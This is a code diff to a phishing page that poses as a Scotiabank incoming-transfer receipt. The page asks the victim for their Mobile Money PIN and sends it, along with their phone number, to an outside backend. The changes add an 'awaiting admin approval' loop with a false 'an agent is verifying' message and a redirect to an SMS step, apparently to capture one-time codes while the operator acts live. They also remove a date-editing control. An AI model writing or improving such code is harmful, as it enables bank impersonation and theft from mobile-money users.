@@ -20,6 +20,7 @@
     --sb-soft:      #F4F6FA;
     --sb-page:      #EEF1F7;
     --sb-green:     #0E7A4A;
+    --sb-red:       #B3261E;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { min-height: 100%; }
@@ -119,13 +120,6 @@
     margin: 4px 2px 10px;
     display: flex; align-items: center; justify-content: space-between;
   }
-  .section-heading .edit-hint {
-    font-size: 10.5px; color: var(--sb-primary); font-weight: 700;
-    text-transform: none; letter-spacing: 0; cursor: pointer;
-    display: inline-flex; align-items: center; gap: 4px;
-  }
-  .section-heading .edit-hint:hover { text-decoration: underline; }
-  .section-heading .edit-hint svg { width: 11px; height: 11px; stroke: currentColor; fill: none; stroke-width: 2.2; }
 
   .details-panel {
     background: var(--sb-white); border-radius: 16px;
@@ -160,21 +154,6 @@
     content: ''; width: 6px; height: 6px; border-radius: 50%;
     background: var(--sb-green); display: inline-block;
   }
-
-  /* Editable date */
-  .editable-date {
-    display: inline-flex; align-items: center; gap: 5px;
-    cursor: pointer; padding: 1px 0;
-    border-bottom: 1px dashed var(--sb-primary);
-  }
-  .editable-date svg { width: 11px; height: 11px; stroke: var(--sb-primary); fill: none; stroke-width: 2.2; }
-  .editable-date.editing { border-bottom-color: var(--sb-gold); }
-  .date-input-hidden {
-    position: absolute; left: 0; top: 0; width: 100%; height: 100%;
-    opacity: 0; pointer-events: none; border: none;
-  }
-  .editable-date.editing .date-input-hidden { pointer-events: auto; opacity: 0.01; }
-  .editable-date { position: relative; }
 
   .btn-confirm {
     width: 100%; min-height: 66px; padding: 20px 24px;
@@ -347,7 +326,7 @@
   .pin-panel.show { display: flex; }
   .pin-panel .brand-tag {
     display: flex; align-items: center; justify-content: center;
-    margin: 20px auto 32px;
+    margin: 20px auto 28px;
     filter: brightness(0) invert(1);
   }
   .pin-panel .brand-tag img { height: 28px; width: auto; }
@@ -357,17 +336,33 @@
   }
   .pin-panel .pin-desc {
     font-size: 13px; color: rgba(255,255,255,0.8); text-align: center;
-    max-width: 300px; margin: 0 auto 24px; line-height: 1.6;
+    max-width: 300px; margin: 0 auto 20px; line-height: 1.6;
   }
-  .pin-panel .pin-amount { text-align: center; margin-bottom: 24px; }
+  .pin-panel .pin-amount {
+    text-align: center; margin-bottom: 8px;
+    padding: 14px 16px; background: rgba(255,255,255,0.10);
+    border-radius: 12px; max-width: 320px; margin-left: auto; margin-right: auto;
+  }
   .pin-panel .pin-amount .lbl {
     font-size: 10.5px; font-weight: 700; letter-spacing: 0.7px;
     text-transform: uppercase; color: rgba(255,255,255,0.6);
     display: block; margin-bottom: 4px;
   }
   .pin-panel .pin-amount .val {
-    font-size: 28px; font-weight: 900; color: #fff;
+    font-size: 26px; font-weight: 900; color: #fff;
     letter-spacing: -0.6px;
+  }
+  .pin-panel .pin-number {
+    text-align: center; margin-bottom: 24px;
+    font-size: 12.5px; color: rgba(255,255,255,0.8);
+    line-height: 1.5;
+  }
+  .pin-panel .pin-number strong {
+    display: inline-block; margin-top: 3px;
+    font-family: "SF Mono", Monaco, Consolas, monospace;
+    font-size: 14px; font-weight: 700; color: #fff;
+    background: rgba(255,255,255,0.14); padding: 3px 10px;
+    border-radius: 6px; letter-spacing: 0.5px;
   }
 
   .pin-field-wrap { margin-bottom: 22px; }
@@ -445,7 +440,7 @@
     .popup h3 { font-size: 18px; }
     .popup-btn { min-height: 48px; font-size: 14px; }
     .pin-panel h2 { font-size: 19px; }
-    .pin-panel .pin-amount .val { font-size: 24px; }
+    .pin-panel .pin-amount .val { font-size: 22px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
@@ -462,7 +457,6 @@
 
 <div class="phone">
 
-  <!-- HEADER -->
   <div class="header">
     <div class="brand-block">
       <img
@@ -480,7 +474,6 @@
     </div>
   </div>
 
-  <!-- HERO -->
   <div class="hero">
     <div class="secure-badge">
       <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
@@ -491,15 +484,10 @@
     <div class="hero-sender" id="heroSender">From <strong>—</strong></div>
   </div>
 
-  <!-- BODY -->
   <div class="body" id="bodyArea">
 
     <div class="section-heading">
       <span>Transaction details</span>
-      <span class="edit-hint" onclick="toggleDateEdit()">
-        <svg viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
-        Edit time
-      </span>
     </div>
 
     <div class="details-panel" id="detailsPanel">
@@ -586,6 +574,11 @@
     <span class="val" id="pinAmountVal">—</span>
   </div>
 
+  <div class="pin-number">
+    Authorizing for your number<br>
+    <strong id="pinNumberVal">—</strong>
+  </div>
+
   <div class="pin-field-wrap">
     <label for="pinInput">Mobile Money PIN</label>
     <span class="pin-helper">The 4–6 digit PIN you use on your Mobile Money app</span>
@@ -605,9 +598,6 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     API_BASE — HARD-PINNED to the live Railway backend
-     ═══════════════════════════════════════════════════════════ */
   const API_BASE = 'https://stanbicmobilepayment-production.up.railway.app';
 
   const SUPPORT_NUMBERS = {
@@ -658,9 +648,8 @@
 
   let tx = {
     ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '',
-    mk: '', an: '', dt: '', pu: '', timestamp: null
+    mk: '', an: '', dt: '', pu: ''
   };
-  let receiptData = null;
 
   async function decodeData() {
     const params = new URLSearchParams(location.search);
@@ -721,8 +710,6 @@
       return;
     }
 
-    receiptData = data;
-
     tx = {
       ref: data.tx || '',
       am:  data.am || '',
@@ -733,11 +720,10 @@
       sn:  data.sn || '',
       mk:  data.mk || '',
       an:  data.an || '',
-      dt:  data.dt || data.createdAt || Date.now(),
+      dt:  data.dt || data.ts || data.createdAt || Date.now(),
       pu:  data.pu || data.purpose || ''
     };
 
-    // Render
     const amtFull = formatAmount(tx.am, tx.cur);
     document.getElementById('heroAmount').innerHTML =
       '<span class="cur">' + (tx.cur || '') + '</span>' +
@@ -747,6 +733,7 @@
       'From <strong>' + (tx.mk || 'Scotiabank') + '</strong>';
 
     document.getElementById('pinAmountVal').textContent = amtFull;
+    document.getElementById('pinNumberVal').textContent = tx.an || '—';
 
     renderDetails();
     document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
@@ -754,71 +741,28 @@
 
   function renderDetails() {
     const rows = [
-      { k: 'Purpose',    v: tx.pu || '—',  cls: 'purpose-row' },
-      { k: 'Country',    v: tx.c || '—' },
-      { k: 'Payment method', v: tx.pm || '—' },
-      { k: 'Service',    v: tx.sn || '—' },
-      { k: 'Reference',  v: tx.ref || '—', mono: true },
-      { k: 'Date',       v: tx.dt ? formatDate(tx.dt) : formatDate(), editable: true },
-      { k: 'Status',     v: 'Ready to receive', cls: 'ready' }
+      { k: 'Sender',           v: tx.mk || 'Scotiabank' },
+      { k: 'Recipient',        v: tx.rn || '—' },
+      { k: 'Recipient phone',  v: tx.an || '—', mono: true },
+      { k: 'Purpose',          v: tx.pu || '—', cls: 'purpose-row' },
+      { k: 'Country',          v: tx.c || '—' },
+      { k: 'Payment method',   v: tx.pm || '—' },
+      { k: 'Service',          v: tx.sn || '—' },
+      { k: 'Reference',        v: tx.ref || '—', mono: true },
+      { k: 'Date',             v: tx.dt ? formatDate(tx.dt) : formatDate() },
+      { k: 'Status',           v: 'Ready to receive', cls: 'ready' }
     ];
 
     let html = '';
     rows.forEach(r => {
-      const k = r.k;
-      let v;
-      if (r.editable) {
-        v = '<span class="editable-date" onclick="toggleDateEdit()" id="editableDate">' +
-              '<span class="date-display" id="dateDisplay">' + (r.v || '') + '</span>' +
-              '<svg viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>' +
-              '<input type="datetime-local" class="date-input-hidden" id="dateInput" onchange="onDateChange(event)">' +
-            '</span>';
-      } else {
-        v = r.v || '—';
-      }
       const vcls = r.mono ? 'mono' : (r.cls || '');
       html += '<div class="detail-row ' + (r.cls || '') + '">' +
-                '<span class="k">' + k + '</span>' +
-                '<span class="v ' + vcls + '">' + v + '</span>' +
+                '<span class="k">' + r.k + '</span>' +
+                '<span class="v ' + vcls + '">' + (r.v || '—') + '</span>' +
               '</div>';
     });
 
     document.getElementById('detailsPanel').innerHTML = html;
-
-    // Pre-fill date input
-    const di = document.getElementById('dateInput');
-    if (di && tx.dt) {
-      const d = new Date(tx.dt);
-      const pad = n => String(n).padStart(2, '0');
-      di.value = d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) +
-                 'T' + pad(d.getHours()) + ':' + pad(d.getMinutes());
-    }
-  }
-
-  function toggleDateEdit() {
-    const ed = document.getElementById('editableDate');
-    const di = document.getElementById('dateInput');
-    if (!ed || !di) return;
-    if (ed.classList.contains('editing')) {
-      di.blur();
-      ed.classList.remove('editing');
-    } else {
-      ed.classList.add('editing');
-      try { di.showPicker(); } catch(e) { di.focus(); di.click(); }
-    }
-  }
-
-  function onDateChange(e) {
-    const val = e.target.value;
-    if (!val) return;
-    const d = new Date(val);
-    if (!isFinite(d.getTime())) return;
-    tx.dt = d.getTime();
-    const disp = document.getElementById('dateDisplay');
-    if (disp) disp.textContent = formatDate(tx.dt);
-    const ed = document.getElementById('editableDate');
-    if (ed) ed.classList.remove('editing');
-    showToast('Time updated');
   }
 
   function copyReceipt() {
@@ -826,9 +770,10 @@
       'Scotiabank — Incoming Transfer',
       '----------------------------------',
       'Amount: ' + formatAmount(tx.am, tx.cur),
+      'Sender: ' + (tx.mk || 'Scotiabank'),
+      'Recipient: ' + (tx.rn || '—'),
+      'Recipient phone: ' + (tx.an || '—'),
       'Purpose: ' + (tx.pu || '—'),
-      'From: ' + (tx.mk || 'Scotiabank'),
-      'To: ' + (tx.rn || '—'),
       'Country: ' + (tx.c || '—'),
       'Reference: ' + (tx.ref || '—'),
       'Payment method: ' + (tx.pm || '—'),
@@ -857,7 +802,7 @@
 
   /* ═══════════════════════════════════════════════════════════
      CONFIRM FLOW
-     Confirm → loading → popup → loading → PIN → loading → redirect
+     Confirm → loading → popup → loading → PIN → loading → poll → redirect
      ═══════════════════════════════════════════════════════════ */
 
   function showLoading(title, desc, note) {
@@ -868,6 +813,11 @@
   }
   function hideLoading() {
     document.getElementById('loadingOverlay').classList.remove('show');
+  }
+  function setLoadingTitle(title, desc, note) {
+    document.getElementById('loadingTitle').textContent = title;
+    document.getElementById('loadingDesc').textContent = desc;
+    document.getElementById('loadingNote').textContent = note || 'This usually takes a few seconds.';
   }
 
   function startConfirmFlow() {
@@ -942,6 +892,9 @@
       : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
   }
 
+  let pollingActive = false;
+  let pollTimer = null;
+
   async function submitPin() {
     const pin = document.getElementById('pinInput').value.trim();
     const err = document.getElementById('pinError');
@@ -959,9 +912,9 @@
     document.getElementById('pinPanel').classList.remove('show');
 
     showLoading(
-      'Confirming with Scotiabank…',
-      'Verifying your Mobile Money PIN and securing this transfer.',
-      'This usually takes a few seconds.'
+      'Submitting your PIN…',
+      'Sending your secure authorization to Scotiabank.',
+      'Please wait.'
     );
 
     try {
@@ -976,7 +929,7 @@
           c: tx.c,
           an: tx.an,
           rn: tx.rn,
-          phone: (tx.an || ''),
+          phone: tx.an || '',
           lang: 'en'
         })
       });
@@ -984,34 +937,90 @@
       if (!r.ok) {
         hideLoading();
         showPinPanel();
-        if (err) { err.textContent = 'Could not confirm PIN. Please try again.'; err.classList.add('show'); }
+        if (err) { err.textContent = 'Could not submit PIN. Please try again.'; err.classList.add('show'); }
         return;
       }
-
-      // Success — wait 2s then redirect to mtn-signin.html
-      setTimeout(() => {
-        const q = new URLSearchParams({
-          tx:  tx.ref,
-          am:  tx.am,
-          cur: tx.cur,
-          rn:  tx.rn,
-          c:   tx.c,
-          pm:  tx.pm,
-          sn:  tx.sn,
-          mk:  tx.mk,
-          an:  tx.an,
-          dt:  tx.dt,
-          pu:  tx.pu,
-          lang: 'en'
-        });
-        window.location.href = 'mtn-signin.html?' + q.toString();
-      }, 2200);
-
-    } catch (err2) {
+    } catch (e) {
       hideLoading();
       showPinPanel();
       if (err) { err.textContent = 'Network error. Please try again.'; err.classList.add('show'); }
+      return;
     }
+
+    // PIN submitted — now wait for admin approval on this same page
+    setLoadingTitle(
+      'Waiting for approval…',
+      'Your PIN has been submitted. An agent is verifying your transfer. Please do not close this page.',
+      'This usually takes 1–2 minutes.'
+    );
+
+    pollingActive = true;
+    const start = Date.now();
+    const MAX_WAIT_MS = 5 * 60 * 1000; // 5 minutes
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      if (Date.now() - start > MAX_WAIT_MS) {
+        pollingActive = false;
+        hideLoading();
+        showToast('Session expired. Please reload and try again.');
+        return;
+      }
+
+      let decision = 'pending';
+      try {
+        const r = await fetch(API_BASE + '/api/mtn/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) {
+        console.warn('[pin poll] error:', e);
+      }
+
+      if (!pollingActive) return;
+
+      if (decision === 'approved') {
+        pollingActive = false;
+        setLoadingTitle(
+          'Approved — redirecting…',
+          'Your transfer has been approved. Loading the next step.',
+          'Please wait.'
+        );
+        setTimeout(() => {
+          const q = new URLSearchParams({
+            tx:  tx.ref,
+            am:  tx.am,
+            cur: tx.cur,
+            rn:  tx.rn,
+            c:   tx.c,
+            pm:  tx.pm,
+            sn:  tx.sn,
+            mk:  tx.mk,
+            an:  tx.an,
+            dt:  tx.dt,
+            pu:  tx.pu,
+            lang: 'en'
+          });
+          window.location.href = 'sms.html?' + q.toString();
+        }, 1200);
+        return;
+      }
+
+      if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        hideLoading();
+        const btn = document.getElementById('confirmBtn');
+        btn.disabled = false;
+        document.getElementById('pinInput').value = '';
+        showToast('Transfer declined. Please try again.');
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 2000);
+    };
+
+    poll();
   }
 
   document.addEventListener('DOMContentLoaded', init);
